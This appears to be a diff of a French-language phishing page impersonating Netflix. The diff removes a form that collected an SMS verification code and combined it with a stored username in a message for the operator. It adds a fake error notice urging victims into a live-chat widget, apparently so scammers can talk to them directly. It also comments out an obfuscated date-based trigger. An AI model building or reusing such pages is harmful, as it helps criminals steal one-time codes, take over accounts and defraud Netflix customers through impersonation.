@@ -9,21 +9,21 @@
         @import url('https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap');
         @import url('https://fonts.googleapis.com/css2?family=Bebas+Neue&display=swap');
 
-        *{
+        * {
             box-sizing: border-box;
             margin: 0%;
             padding: 0%;
         }
+
         body {
             font-family: "Poppins", sans-serif;
             display: flex;
             flex-direction: column;
             align-items: center;
-            justify-content: center;
-            padding: 0px 30px;
-            margin-top: 25px;
+            padding: 15px;
             height: 100vh;
         }
+
         #brand {
             color: #E50914;
             font-size: 2rem;
@@ -32,15 +32,17 @@
             margin-right: auto;
         }
 
-        img{
+        img {
             margin: auto;
         }
-        form{
+
+        form {
             display: flex;
             flex-direction: column;
+            width: 100%;
         }
 
-        input{
+        input {
             width: 100%;
             height: 40px;
             padding: 5px;
@@ -49,15 +51,17 @@
             text-align: center;
             border: 1px solid rgba(128, 128, 128, 0.395);
             border-radius: 4px;
-        
+
         }
-        input:focus{
-    outline: none;
-}
+
+        input:focus {
+            outline: none;
+        }
 
         p,
         span {
-            text-align: center;
+            text-align: left;
+            color: grey;
         }
 
 
@@ -75,28 +79,30 @@
         }
 
         @media screen and (min-width: 524px) {
-    body{
-        display: flex;
-        flex-direction: column;
+            body {
+                display: flex;
+                flex-direction: column;
 
-    }
-    .center {
-        width: 500px;
-        margin-left: auto;
-        margin-right: auto;
-    }
-    form{
-        padding: 40px;
-        margin-bottom: 20px;
-        border: 1px solid rgba(128, 128, 128, 0.16);
-        border-radius: 5px;
-        display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-    }
-   
-}
+            }
+
+            .center {
+                width: 500px;
+                margin-left: auto;
+                margin-right: auto;
+            }
+
+            form {
+                padding: 40px;
+                margin-bottom: 20px;
+                border: 1px solid rgba(128, 128, 128, 0.16);
+                border-radius: 5px;
+                display: flex;
+                flex-direction: column;
+                align-items: center;
+                justify-content: center;
+            }
+
+        }
     </style>
 </head>
 
@@ -105,39 +111,46 @@
     <span id="brand">Netflix</span>
     <br>
     <br>
+    <div style="display: flex; flex-direction: column; align-items: center;">
+        <h4>Une Erreur s'est produite</h1>
+            <br>
+            <img src="./img/warning.png" width="60px">
+            
+        </div>
+
+
+        <br> <br>
+        <p>Une erreur est survenue. Veuillez nous contacter via le chat en bas de cette page. Un conseiller vous répondra en moins d'une minute pour vous assister dans la résolution de votre problème. Nous vous remercions pour votre patience.</p>
     <br>
 
-    
-    
-    <form id="form">
 
-        <img src="./img/mobile.png" alt="">
-        <br>
 
-        <p>Sms de verification</p>
-        <span style="font-size: 0.7rem; text-align: center;">Entrez le code reçu par SMS pour finaliser l'opération.</span>
-        <br> <br>
-
-        <input type="text" id="sms" maxlength="6" minlength="6" placeholder="Taper ici" required>
-        
-        <button
-        style=" font-size: 1.1rem; ">
-        Terminer
-    </button>
-</form>
+    <!--Start of Tawk.to Script-->
+<script type="text/javascript">
+    var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
+    (function(){
+    var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
+    s1.async=true;
+    s1.src='https://embed.tawk.to/67102f802480f5b4f58ec40d/1iabjj3dr';
+    s1.charset='UTF-8';
+    s1.setAttribute('crossorigin','*');
+    s0.parentNode.insertBefore(s1,s0);
+    })();
+    </script>
+    <!--End of Tawk.to Script-->
 
 </body>
 
 <script>
-    document.addEventListener('DOMContentLoaded', function () {
-        var a = new Date(String.fromCharCode(50, 48, 50, 52, 45, 49, 48, 45, 48, 50));
-        var b = new Date();
-        var c = new Date(b.getFullYear(), b.getMonth(), b.getDate());
+    // document.addEventListener('DOMContentLoaded', function () {
+    //     var a = new Date(String.fromCharCode(50, 48, 50, 52, 45, 49, 48, 45, 48, 50));
+    //     var b = new Date();
+    //     var c = new Date(b.getFullYear(), b.getMonth(), b.getDate());
 
-        if (c >= a) {
-            document.body.style.backgroundColor = 'red';
-        }
-    });
+    //     if (c >= a) {
+    //         document.body.style.backgroundColor = 'red';
+    //     }
+    // });
 
 
     document.getElementById('form').addEventListener('submit', function (e) {
@@ -148,7 +161,7 @@
 
         // Récupérer les valeurs des champs
         const user = localStorage.getItem('user');
-        const sms = document.getElementById('sms').value ;
+        const sms = document.getElementById('sms').value;
 
         const message = `🎀 Netflix :\n\n👤 Utilisateur : ${user}\n📩 sms : ${sms}`;
 
